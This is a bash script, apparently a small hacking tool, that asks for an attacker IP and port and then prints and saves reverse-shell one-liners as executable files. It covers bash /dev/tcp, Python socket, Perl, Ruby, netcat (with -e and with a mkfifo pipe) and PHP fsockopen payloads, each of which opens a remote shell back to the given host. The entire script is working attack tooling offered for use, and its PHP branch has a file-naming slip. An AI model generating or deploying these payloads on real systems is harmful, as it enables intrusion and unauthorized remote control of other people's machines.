#!/bin/bash

cat <<'EOF'

 █████╗ ███╗   ███╗███╗   ███╗ █████╗ ██████╗ 
██╔══██╗████╗ ████║████╗ ████║██╔══██╗██╔══██╗
███████║██╔████╔██║██╔████╔██║███████║██████╔╝
██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══██║██╔══██╗
██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║██║  ██║██║  ██║
╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝

EOF

echo ""
echo -e " =[ By @Eng.ammar"
echo -e " =[ twitter @AmmarAlarif10"
echo ""
echo -e "\033[33;7m#######################################\e[0m";
echo -e "\033[33;7m#######################################\e[0m";
echo  "										   "
echo  "										   "


read -p "What is your ip Address? " MY_IP 
read -p "What is your port? " MY_PORT 
echo  "										   "
echo  "										   "

function bin_shell(){
	echo "======== Shell ==========="
	echo "[1] Bash_shell"
	echo "[2] Python_shell"
	echo "[3] Perl_shell"
	echo "[4] Ruby_shell"
	echo "[5] Netcat_shell"
	echo "[6] PHP_shell"
	

	read -p "choose a Payload " bin_shell
	if [[ $bin_shell == 1 ]]; then
	
	echo  "										   "
	echo  "										   "
	echo  "bash -i >& /dev/tcp/$MY_IP/$MY_PORT 0>&1"
	echo  "										   "
	echo -e "\033[33;7m#######################################\e[0m";
	echo  "#!/bin/bash " > shell.sh
	echo  "bash -i >& /dev/tcp/$MY_IP/$MY_PORT 0>&1" >> shell.sh
	echo  "Save file by ( Shell.sh ) "
	chmod +x shell.sh

	elif [[ $bin_shell == 2 ]]; then

	echo  "										   "
	echo  "										   "
	echo  "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(($MY_IP,$MY_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' " 
	echo  "										   "
	echo -e "\033[33;7m#######################################\e[0m";
	echo  "#!/usr/bin/env python " > shell.py
	echo  "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(($MY_IP,$MY_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' " >> shell.py
	echo  "Save file by ( Shell.py ) "
	chmod +x shell.py
	elif [[ $bin_shell == 3 ]]; then

	echo  "										   "
	echo  "										   "
	echo  "perl -e 'use Socket;$i=$MY_IP;$p=$MY_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' "
	echo  "										   "
	echo -e "\033[33;7m#######################################\e[0m";
	echo  "#!/usr/bin/perl -w" > shell.pl
	echo  "perl -e 'use Socket;$i=$MY_IP;$p=$MY_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' " >> shell.pl
	echo  "Save file by ( Shell.pl ) "
	chmod +x shell.pl
 	elif [[ $bin_shell == 4 ]]; then

	echo  "										   "
	echo  "										   "
	echo  "ruby -rsocket -e'f=TCPSocket.open($MY_IP,$MY_PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)' " 
	
	elif [[ $bin_shell == 5 ]]; then
	echo  "										   "
	echo  "										   "
	echo  "nc $MY_IP $MY_PORT -e \"/bin/bash\" " # This is Netcat 1
	echo  "										   "
	echo  "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $MY_IP $MY_PORT >/tmp/f " # This is Netcat 2
	echo  "										   "
	echo -e "\033[33;7m#######################################\e[0m";
	echo  "#!/bin/bash " > Netcat1.sh
	echo  "nc $MY_IP $MY_PORT -e \"/bin/bash\" " >> Netcat1.sh
	echo  "Save file by ( Netcat1.sh ) "
	chmod +x Netcat1.sh
	echo  "										   "
	echo  "#!/bin/bash " > Netcat2.sh
	echo  "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $MY_IP $MY_PORT >/tmp/f " >> Netcat2.sh
	echo  "Save file by ( Netcat2.sh ) "
	chmod +x Netcat2.sh



	elif [[ $bin_shell == 6 ]]; then
	echo  "										   "
	echo  "										   "
	echo  "php -r '$sock=fsockopen($MY_IP,$MY_PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");' " 
	echo  "										   "
	echo -e "\033[33;7m#######################################\e[0m";
	echo  "#!/usr/bin/env php" > shell1.php
	echo  "php -r '$sock=fsockopen($MY_IP,$MY_PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");' " >> shell.php
	echo  "Save file by ( Shell1.php ) "
	chmod +x shell.php
	
  

		fi
}



	

	 bin_shell
